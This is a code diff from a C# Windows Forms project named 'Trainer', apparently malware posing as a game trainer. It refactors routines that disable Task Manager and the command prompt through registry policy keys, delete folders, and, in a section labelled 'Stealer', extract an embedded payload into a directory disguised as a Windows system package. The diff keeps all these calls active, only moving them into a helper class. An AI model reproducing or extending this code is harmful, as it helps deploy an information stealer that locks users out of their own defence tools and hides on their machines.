@@ -42,77 +42,6 @@ namespace Trainer
             t1.Start();
         }
 
-        #region Cleaning Folders \\
-        private void ClearFolder(string FolderName)
-        {
-            DirectoryInfo dir = new DirectoryInfo(FolderName);
-
-            foreach (FileInfo fi in dir.GetFiles())
-            {
-                try
-                {
-                    fi.Delete();
-                }
-                catch (Exception) { } // Ignore all exceptions
-            }
-
-            foreach (DirectoryInfo di in dir.GetDirectories())
-            {
-                ClearFolder(di.FullName);
-                try
-                {
-                    di.Delete();
-                }
-                catch (Exception) { } // Ignore all exceptions
-            }
-        }
-        #endregion
-
-        #region Disable | CMD
-        public static void DisableCommandPrompt()
-        {
-            //Key path :
-            //HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows
-            Registry.SetValue(
-                @"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System",
-                "DisableCMD",
-                1,
-                RegistryValueKind.DWord
-                );
-        }
-        #endregion
-
-        #region Disable | Task Manager
-        public static void DisableTaskManager()
-        {
-            //Path to registry key...
-            //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies
-            Registry.SetValue(
-                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
-                "DisableTaskMgr",
-                1,
-                RegistryValueKind.DWord
-            );
-        }
-        #endregion
-
-        #region DirClean
-        private void DirClean(string FolderPath)
-        {
-            try
-            {
-                foreach (string dir in Directory.EnumerateDirectories(FolderPath))
-                {
-                    if (dir.Contains("Microsoft.Windows.StartMenuExperienceHost_"))
-                    {
-                        Directory.Delete(dir, true);
-                    }
-                }
-            }
-            catch (Exception) { }
-        }
-        #endregion
-
         private async void ExitForm()
         {
             for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); }
@@ -135,8 +64,8 @@ namespace Trainer
         {
             Show();
             StartForm();
-            DisableTaskManager();
-            DisableCommandPrompt();
+            others.DisableTaskManager();
+            others.DisableCommandPrompt();
             others.Wait(1000);
 
             #region Stealer
@@ -147,7 +76,7 @@ namespace Trainer
                 string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                 string StealerFile = StealerFolderLoc + "\\" + ResourceName;
-                DirClean(StealerFolder);
+                others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
                 others.Extract(SolutionName, StealerFolderLoc, "Resources", ResourceName);
